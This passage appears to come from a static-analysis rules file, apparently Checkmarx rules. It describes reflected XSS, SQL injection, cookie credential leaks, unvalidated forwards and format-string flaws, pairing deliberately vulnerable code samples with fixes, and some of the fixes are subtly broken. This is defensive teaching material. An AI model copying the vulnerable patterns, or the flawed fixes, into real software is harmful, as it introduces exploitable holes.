&lt;/div&gt;&lt;div style="font-size:90%;"&gt;}&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Relationships"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Relationships&lt;/div&gt;&lt;div name="oc_780_Relationships" id="oc_780_Relationships" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" id="Detail"&gt;&lt;tr&gt;&lt;th valign="top"&gt;Nature&lt;/th&gt;&lt;th valign="top"&gt;Type&lt;/th&gt;&lt;th valign="top"&gt;ID&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Name&lt;/th&gt;&lt;th valign="middle" class="left" style="text-align:center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;View(s) this relationship pertains to&lt;/span&gt;&lt;/span&gt;&lt;/th&gt;&lt;/tr&gt;
&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Category&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;310&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=310" target="_blank"&gt;Cryptographic Issues&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Base&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;327&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=327" target="_blank"&gt;Use of a Broken or Risky Cryptographic Algorithm&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;1000&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;

&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="References"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;References&lt;/div&gt;&lt;div name="oc_780_References" id="oc_780_References" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td valign="top"&gt;Ronald L. Rivest and
Burt Kaliski. "RSA Problem". 2003-12-10. &amp;lt;&lt;a href="http://people.csail.mit.edu/rivest/RivestKaliski-RSAProblem.pdf" target="_blank"&gt;http://people.csail.mit.edu/rivest/RivestKaliski-RSAProblem.pdf&lt;/a&gt;&amp;gt;.&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;"Optimal Asymmetric Encryption Padding". Wikipedia. 2009-07-08. &amp;lt;&lt;a href="http://en.wikipedia.org/wiki/Optimal_Asymmetric_Encryption_Padding" target="_blank"&gt;http://en.wikipedia.org/wiki/Optimal_Asymmetric_Encryption_Padding&lt;/a&gt;&amp;gt;.&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Maintenance Notes"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Maintenance Notes&lt;/div&gt;&lt;div name="oc_780_Maintenance Notes" id="oc_780_Maintenance Notes" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td&gt;
&lt;p&gt;This entry could probably have a new parent related to improper padding,
however the role of padding in cryptographic algorithms can vary, such as
hiding the length of the plaintext and providing additional random bits for
the cipher. In general, cryptographic problems in CWE are not well organized
and further research is needed.&lt;/p&gt;
&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Content History"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Content History&lt;/div&gt;&lt;div name="oc_780_Content History" id="oc_780_Content History" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Submissions&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Submission Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Submitter&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2009-07-08&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top"&gt;Fortify Software&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;External Submission&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;Based on information from Fortify
Software.&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;

&lt;/html&gt;

&lt;div align="right" style="padding-top:5px; padding-bottom:5px; clear:right" class="noprint"&gt;&lt;a class="backtop" href="#top"&gt;Back to top&lt;/a&gt;&lt;/div&gt;

&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;&lt;/html&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_578</key><name>GWT_Reflected_XSS</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;An attacker could use social engineering to cause a user to send the website engineered input, rewriting web pages and inserting malicious scripts. The attacker can then pretend to be the original website, which would enable the attacker to steal the user's password, request the user&amp;#8217;s credit card information, provide false information, or run malware. From the victim&amp;#8217;s point of view, this is the original website, and the victim would blame the site for incurred damage.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;The application creates web pages that include data from previous user input. The user input is embedded directly in the page's HTML, causing the browser to display it as part of the web page. If the input includes HTML fragments or JavaScript, these are displayed too, and the user cannot tell that this is not the intended page. The vulnerability is the result of embedding arbitrary user input without first encoding it in a format that would prevent the browser from treating it like HTML instead of plain text.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;ol&gt;
&lt;li&gt;Validate all input, regardless of source. Validation should be based on a whitelist: accept only data fitting a specified structure, rather than reject bad patterns. Check for:&lt;/li&gt;
&lt;ul&gt;
&lt;li&gt;Data type&lt;/li&gt;
&lt;li&gt;Size&lt;/li&gt;
&lt;li&gt;Range&lt;/li&gt;
&lt;li&gt;Format&lt;/li&gt;
&lt;li&gt;Expected values&lt;/li&gt;
&lt;/ul&gt;
&lt;li&gt;Fully encode all dynamic data before embedding it in output.&lt;/li&gt;
&lt;li&gt;Encoding should be context-sensitive. For example:&lt;/li&gt;
&lt;ul&gt;
&lt;li&gt;HTML encoding for HTML content&lt;/li&gt;
&lt;li&gt;HTML Attribute encoding for data output to attribute values&lt;/li&gt;
&lt;li&gt;JavaScript encoding for server-generated JavaScript.&lt;/li&gt;
&lt;/ul&gt;
&lt;li&gt;Consider using either the ESAPI encoding library, or the built-in platform functions. For earlier versions of ASP.NET, consider using the AntiXSS library.&lt;/li&gt;
&lt;li&gt;In the Content-Type HTTP response header, explicitly define character encoding (charset) for the entire page.&lt;/li&gt;
&lt;li&gt;Set the httpOnly flag on the session cookie, to prevent XSS exploits from stealing the cookie.&lt;/li&gt;
&lt;/ol&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;CSharp&lt;/h3&gt;&lt;h4&gt;Bad - The application uses the "Referer" field string to construct the HttpResponse&lt;/h4&gt;&lt;pre&gt;public class ReflectedXssAllClients
{
        public static void foo(HttpRequest Request, HttpResponse Response)
        {
                string Referer = Request.QueryString["Referer"];
                Response.BinaryWrite(Referer);
        }
}&lt;/pre&gt;&lt;h4&gt;Good - The "Referer" field string is HTML encoded before use&lt;/h4&gt;&lt;pre&gt;public class ReflectedXssAllClientsFixed
{
        public static void foo(HttpRequest Request, HttpResponse Response, AntiXss.AntiXssEncoder encoder)
        {
                string Referer = Request.QueryString["Referer"];
                Response.BinaryWrite(encoder.HtmlEncode(Referer, true));
        }
}&lt;/pre&gt;&lt;h4&gt;Bad - User input is written to a TextBox displayed on the screen enabling a user to inject a script&lt;/h4&gt;&lt;pre&gt;public class ReflectedXSSSpecificClients
{
        public void foo(TextBox tb)
        {
                string input = Console.ReadLine();
                tb.Text = input;
        }
}&lt;/pre&gt;&lt;h4&gt;Good - The user input is HTML encoded before being displayed on the screen&lt;/h4&gt;&lt;pre&gt;public class ReflectedXSSSpecificClientsFixed
{
        public void foo(TextBox tb, AntiXssEncoder encode)
        {
                string input = Console.ReadLine();
                tb.Text = encode.HtmlEncode(input);
        }
}&lt;/pre&gt;&lt;h4&gt;Bad - The application uses the "filename" field string from an HttpRequest construct an HttpResponse&lt;/h4&gt;&lt;pre&gt;public class UTF7XSS
{
        public void foo(HttpRequest Request, HttpResponse Response
        {
                Response.Charset("UTF-7");
                string filename = Request.QueryString["filename"];
                Response.BinaryWrite(AntiXss.HtmlEncode(filename));
        }
}&lt;/pre&gt;&lt;h4&gt;Good - The "filename" string is converted to an int and using a switch case the new "filename" string is constructed&lt;/h4&gt;&lt;pre&gt;public class UTF7XSSFixed
{
        public static void foo(HttpRequest Request, HttpResponse Response)
        {
                Response.Charset("UTF-7");
                string filename = Request.QueryString["fileNum"];
                int fileNum = Convert.ToInt32(filename);
                
                switch(fileNum)
                {
                        case 1:
                                filename = "File1.txt";
                                break;
                        default:
                                filename = "File2.txt";
                                break;
                }
                
                Response.BinaryWrite(AntiXss.HtmlEncode(filename));
        }
}&lt;/pre&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;User input is written to a label displayed on the screen enabling a user to inject a script&lt;/h4&gt;&lt;pre&gt;public class ReflectedXSSAllClients {
	public static void XSSExample(TextArea name) {	
		Label label = new Label();		
		label.setText("Hello " + name.getText());	
	}
}&lt;/pre&gt;&lt;h4&gt;Switch case is used in order to assemble the label's text value and manage wrong user input&lt;/h4&gt;&lt;pre&gt;public class ReflectedXSSAllClientsFixed {
	public static void XSSExample(TextArea name) {
		Label label = new Label();		
		switch (name) {
		case "Joan":
			label.setText("Hello Joan");	
			break;
		case "Jim":
			label.setText("Hello Jim");	
			break;
		case "James":
			label.setText("Hello James");	
			break;
		default:
			System.out.println("Wrong Input");
		}
	}
}&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>CRITICAL</severity><tag>checkmarx-high</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_611</key><name>Information_Leak_Through_Persistent_Cookies</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;An attacker with access to the user's desktop, or unprotected network connection, could steal the user's password and other sensitive data stored in the cookie. Once the password is stolen, the attacker can impersonate her victim to the application, and do anything the user can do. The application would not be able to discern the difference, since the user's own password was used.&amp;#160;&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;The application sends sensitive user data, including passwords, back to the user's browser embedded in a cookie. Persistent cookies are stored in a file on the user's computer, where they might be accessed by an unauthorized user, thus exposing the user's password.&amp;#160;&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;div&gt;Do not store passwords, or any other secret data besides sessionid, in cookies.&amp;#160;&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;CSharp&lt;/h3&gt;&lt;h4&gt;Storing user credentials in cookie&lt;/h4&gt;&lt;pre&gt;public bool LoginUser(string username, string password)
{
    bool isValid = false;

    if (Authenticate(username, password))
    {
        isValid = true; 
        
        HttpCookie cookie = new HttpCookie("credentials", 
                                            username + ":" + password);
        cookie.Expires = DateTime.Now.AddDays(30);
        
        Response.Cookies.Add(cookie);
    }
    
    return isValid;
}&lt;/pre&gt;&lt;h4&gt;Use a GUID instead of credentials&lt;/h4&gt;&lt;pre&gt;public bool LoginUser(string username, string password)
{
    bool isValid = false;

    if (Authenticate(username, password))
    {
        isValid = true; 
        
        Guid id = Guid.NewGuid(); 
        SaveUserGuidToDB(username, id); 
        
        HttpCookie cookie = new HttpCookie("id", id.ToString());
        cookie.Expires = DateTime.Now;
        cookie.Secure = true;
        cookie.HttpOnly = true;
        
        Response.Cookies.Add(cookie);
    }
    
    return isValid;
}&lt;/pre&gt;&lt;h4&gt;Using FormsAuthentication Class&lt;/h4&gt;&lt;pre&gt;public bool LoginUser(string username, string password)
{
    bool isValid = false;

    if (Authenticate(username, password))
    {
        isValid = true; 
        FormsAuthentication.SetAuthCookie(username, false);
    }
    
    return isValid;
}&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_645</key><name>SQL_Injection_Evasion_Attack</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;An attacker could directly access all of the system's data. Using available&amp;#160;tools and basic text editing, the attacker would be able to steal any sensitive information stored by the system (such as personal user details or credit cards), and possibly change or erase existing data.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;&amp;#160;&lt;/div&gt;
&lt;div&gt;The application communicates with its database by sending a textual SQL query. The application creates the query by simply concatenating strings including the user's input. The&amp;#160;user input is not&amp;#160;checked properly for data type validity nor subsequently sanitized.&lt;/div&gt;
&lt;div&gt;In particular, the application decodes the user input (typically from HTML encoding format), before embedding it in the database query. Since the application decodes the input before using it, an attacker could obscure&amp;#160;his malicious payload by encoding it before sending to the server, thus concealing the attack from most protection mechanisms. &amp;#160;&lt;/div&gt;
&lt;div&gt;As such,&amp;#160;the input could contain SQL commands that would be interpreted as such by the database, without being detected or blocked by most countermeasures.&amp;#160;&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;div&gt;Generic Guidance:&lt;/div&gt;
&lt;div&gt;
&lt;ul&gt;
&lt;ul&gt;
&lt;li&gt;Validate all input, regardless of source. Validation should be based on a whitelist: accept only data fitting a specified structure, rather than reject bad patterns. Check for:&lt;/li&gt;
&lt;ul&gt;
&lt;li&gt;Data type&lt;/li&gt;
&lt;li&gt;Size&lt;/li&gt;
&lt;li&gt;Range&lt;/li&gt;
&lt;li&gt;Format&lt;/li&gt;
&lt;li&gt;Expected values&amp;#160;&lt;/li&gt;
&lt;/ul&gt;
&lt;li&gt;In particular, all data validation should be performed after canonicalization, i.e. after the data has been decoded and simplified.&amp;#160;&lt;/li&gt;
&lt;li&gt;Instead of concatenating strings, use secure database components such as stored procedures, parameterized queries, and object bindings (for commands and parameters). Alternatively, an&amp;#160;even better solution is to use an ORM library, such as EntityFramework, Hibernate, or iBatis.&amp;#160;&lt;/li&gt;
&lt;li&gt;Restrict access to database objects and functionality, according to the Principle of Least Privilege.&lt;/li&gt;
&lt;/ul&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;div&gt;Specific Recommendations:&lt;/div&gt;
&lt;div&gt;
&lt;ul&gt;
&lt;ul&gt;
&lt;li&gt;Perform input sanitization after the decoding.&amp;#160;&lt;/li&gt;
&lt;li&gt;Use Prepared Statements or&amp;#160;Stored Procedures instead of string concatenation.&lt;/li&gt;
&lt;li&gt;Use an ORM (such as Hibernate, iBatis, or EntityFramework) to wrap data access instead of directly querying the database.&amp;#160;&lt;/li&gt;
&lt;/ul&gt;
&lt;/ul&gt;
&lt;div&gt;&amp;#160;&lt;/div&gt;
&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;SQL Injection attack evading sanitization via HTML encoding&lt;/h4&gt;&lt;pre&gt;
String custId = request.getParameter("customerId");

String safeCustId = custId.replace("'", " ");  // Remove all quotes

String query = "SELECT accountBalance FROM customers WHERE customerId = '" 
                    + htmlDecode(safeCustId) + "' ";

Statement s = (Statement) con.createStatement();
ResultSet result = s.executeQuery(query);
&lt;/pre&gt;&lt;h4&gt;Proper Sanitization After Canonicalization using Parameterized Queries&lt;/h4&gt;&lt;pre&gt;
String custId = request.getParameter("customerId");

String safeCustId = htmlDecode(custId);
safeCustId = safeCustId.replace("'", " ");  // Remove all quotes AFTER decoding

String query = "SELECT accountBalance FROM customers WHERE customerId = ?"; 

try {
    PreparedStatement pstmt = connection.prepareStatement( query );
    pstmt.setString( 1, safeCustId );
    ResultSet results = pstmt.executeQuery( );
}
catch (SQLException se) {
    // ... logging and error handling
}
&lt;/pre&gt;&lt;h4&gt;Proper Sanitization After Canonicalization using Stored Procedures&lt;/h4&gt;&lt;pre&gt;
String custId = request.getParameter("customerId");

String safeCustId = htmlDecode(custId);
safeCustId = safeCustId.replace("'", " ");  // Remove all quotes AFTER decoding

String query = "SELECT accountBalance FROM customers WHERE customerId = ?"; 

try {
    CallableStatement cs = conn.prepareCall("{call getAccountBalance(?)}");
    cs.setString(1, safeCustId);
    ResultSet results = cs.executeQuery();
}
catch (SQLException se) {
    // ... logging and error handling
}

&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MAJOR</severity><tag>checkmarx-medium</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_2375</key><name>Unvalidated_Forwards</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;Unvalidated&amp;#160;forwarding may allow an attacker to bypass access control mechanisms. By simply changing the name of the target method in the request, an attacker may be able to cause the application to execute a different method after&amp;#160;performing access checks based on the original value, thus performing some action to which the attacker is not authorized.&amp;#160;&lt;/div&gt;            
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;The application uses forwards to route requests between different parts of the site. In particular,&amp;#160;some pages use a request parameter to indicate which server method should be executed after the initial processing.&amp;#160;&lt;/div&gt;
&lt;div&gt;The attacker could craft a URL that will pass the application&amp;#8217;s access control check, and then be forwarded by the application to sensitive&amp;#160;functionality for which the attacker is not authorized.&lt;/div&gt;            
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;div&gt;Generic Guidance:&lt;/div&gt;
&lt;div&gt;
&lt;ul&gt;
&lt;ul&gt;
&lt;li&gt;If possible, avoid using forwards at all.&amp;#160;&lt;/li&gt;
&lt;li&gt;If it is necessary to use forwarding, do not&amp;#160;base&amp;#160;the target destination on user input.&amp;#160;&lt;/li&gt;
&lt;li&gt;If user input is required to calculate the target, receive a destination code, instead of the method name itself, and map this code on the server to the actual URL.&amp;#160;&lt;/li&gt;
&lt;li&gt;If it is absolutely necessary to allow the user to provide an arbitrary method name (very rare), ensure that the provided&amp;#160;value is valid, and&amp;#160;that the user is authorized to invoke this method.&lt;/li&gt;
&lt;/ul&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;div&gt;Specific Recommendations:&lt;/div&gt;
&lt;div&gt;
&lt;ul&gt;
&lt;ul&gt;
&lt;li&gt;If possible, avoid using server side forwarding at all.&amp;#160;&lt;/li&gt;
&lt;li&gt;In any event,&amp;#160;do not forward server execution to a&amp;#160;target destination based on user input.&amp;#160;&lt;/li&gt;
&lt;/ul&gt;
&lt;/ul&gt;
&lt;/div&gt;            
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;Example of User-Controlled Forwarding&lt;/h4&gt;&lt;pre&gt;
if (user.isAuthenticated) {

    String target = request.getParameter("target"); 

    RequestDispatcher dispatcher = request.getRequestDispatcher(target);
    dispatcher.forward( request, response ); 
}
&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MAJOR</severity><tag>checkmarx-medium</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_1679</key><name>Uncontrolled_Format_String</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;Allowing malicious users to modify&amp;#160;format strings could enable them&amp;#160;to cause an exception to be thrown, possibly crashing the entire application or even just the current module, e.g. to veil malicious activities.&amp;#160;&lt;/div&gt;            
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;The application allows user input to influence the string argument used for formatted print functions. This family of functions expects the first argument to designate the relative format of dynamically constructed output string, including how to represent each of the other arguments.&amp;#160;&lt;/div&gt;
&lt;div&gt;&amp;#160;&lt;/div&gt;
&lt;div&gt;If this format string is malformed, or if it references more arguments than were passed to the&amp;#160;function, then an exception is thrown. If this exception is not caught by the application code, the entire process might crash. Alternatively, if the&amp;#160;exception is caught by a generic exception handler further up the stack, then only the current method will be subverted, possibly bypassing other security checks, such as a logging mechanism.&amp;#160;&lt;/div&gt;            
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;div&gt;Generic Guidance:&lt;/div&gt;
&lt;div&gt;
&lt;ul&gt;
&lt;ul&gt;
&lt;li&gt;Do not allow user input or any other external data to influence the format strings.&amp;#160;&lt;/li&gt;
&lt;li&gt;Ensure that all string format functions are called with a static format string as the format parameter, and that the correct number of arguments are passed to the function, according to the static format string.&amp;#160;&lt;/li&gt;
&lt;li&gt;Alternatively, validate all user input before using it in the format string parameter to print format functions,&amp;#160;and ensure formatting tokens are not included in the input.&amp;#160;&lt;/li&gt;
&lt;/ul&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;div&gt;Specific Recommendations:&lt;/div&gt;
&lt;div&gt;
&lt;ul&gt;
&lt;ul&gt;
&lt;li&gt;Do not include user input in the format string parameter (typically the first argument) to formatting functions.&amp;#160;&lt;/li&gt;
&lt;li&gt;Alternatively,&amp;#160;use only the input's size or length in the format string, but not the actual contents of the input itself.&amp;#160;&lt;/li&gt;
&lt;/ul&gt;
&lt;/ul&gt;
&lt;div&gt;&amp;#160;&lt;/div&gt;
&lt;/div&gt;            
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;Improper use of formatting string&lt;/h4&gt;&lt;pre&gt;
String name = request.getParameter("name"); 
int id = Integer.parseInt(request.getParameter("id"));

System.out.format(name + " has the following id: %d", id); 
    // If name contains "%s" this would throw an exception 
    //   and possibly cause the application to crash&lt;/pre&gt;&lt;h4&gt;Safe use of formatting string&lt;/h4&gt;&lt;pre&gt;
String name = request.getParameter("name"); 
int id = Integer.parseInt(request.getParameter("id"));

System.out.format("%s has the following id: %d", name, id); 
    // Even if name contains other format tokens, 
    //   they will simply be regarded as plain strings&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MAJOR</severity><tag>checkmarx-medium</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_594</key><name>SQL_Injection</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;An attacker could directly access all of the system's data. Using simple tools and text editing, the attacker would be able to steal any sensitive information stored by the system (such as personal user details or credit cards), and possibly change or erase existing data.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;The application communicates with its database by sending a textual SQL query. The application creates the query by simply concatenating strings including the user's input. Since the user input is neither checked for data type validity nor subsequently sanitized, the input could contain SQL commands that would be interpreted as such by the database.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;ol&gt;
&lt;li&gt;Validate all input, regardless of source. Validation should be based on a whitelist: accept only data fitting a specified structure, rather than reject bad patterns. Check for:&lt;/li&gt;
&lt;ul&gt;
&lt;li&gt;Data type&lt;/li&gt;
&lt;li&gt;Size&lt;/li&gt;
&lt;li&gt;Range&lt;/li&gt;
&lt;li&gt;Format&lt;/li&gt;
&lt;li&gt;Expected values.&lt;/li&gt;
&lt;/ul&gt;
&lt;li&gt;Instead of concatenating strings: a. Use secure database components such as stored procedures, parameterized queries, and object bindings (for commands and parameters). b. An even better solution is to use an ORM library, such as EntityFramework, Hibernate, or iBatis.&lt;/li&gt;
&lt;li&gt;Restrict access to database objects and functionality, according to the Principle of Least Privilege.&lt;/li&gt;
&lt;/ol&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;CSharp&lt;/h3&gt;&lt;h4&gt;
The application creates an SQL query using string obtained from the user
      &lt;/h4&gt;&lt;pre&gt;public class SQLInjection
{
        public void foo(TextBox tbUserName, SqliteConnection connection)
        {	
                string user = tbUserName.Text;
                string sql = "insert into users(name) VALUES (user)"
                MySqlCommand cmd = new MySqlCommand(sql, connection);
                connection.Open();
                SqlDataReader reader = cmd.ExecuteReader();
        }
}&lt;/pre&gt;&lt;h4&gt;
The string obtained from the user is checked for potentially malicious characters
      &lt;/h4&gt;&lt;pre&gt;
class SqlInjectionFixed
{
        public void foo(TextBox tbUserName, SqliteConnection connection)
        {
                string user = tbUserName.Text;
                string sql = "insert into users(name) VALUES (@param1)";
                MySqlCommand cmd = new MySqlCommand(sql, connection);
                cmd.Parameters.AddWithValue(@param1, user);
                connection.Open();
                SqlDataReader reader = cmd.ExecuteReader();
        }
}&lt;/pre&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;The application creates an SQL query using string obtained from the user&lt;/h4&gt;&lt;pre&gt;public class SQL_Injection {
	public static void getUserId(Connection con) {
		System.out.println("enter user name");
		Scanner in = new Scanner(System.in);
		String user = in.nextLine();
		String query = "select user_id from User where user = " + user;
		Statement stmt = con.createStatement();
		ResultSet rs = stmt.executeQuery(query);
	}
}&lt;/pre&gt;&lt;h4&gt;The string obtained from the user is checked for potentially malicious characters&lt;/h4&gt;&lt;pre&gt;public class SQL_Injection_Fixed {
	public static void getUserId(Connection con) {
		System.out.println("enter user name");
		Scanner in = new Scanner(System.in);
		String user = in.nextLine();
		String query = "select user_id from User where user = ?";
		PreparedStatement stmt = con.createStatement(query);
		stmt.setString(1, user);
		ResultSet rs = stmt.executeQuery(query);
	}
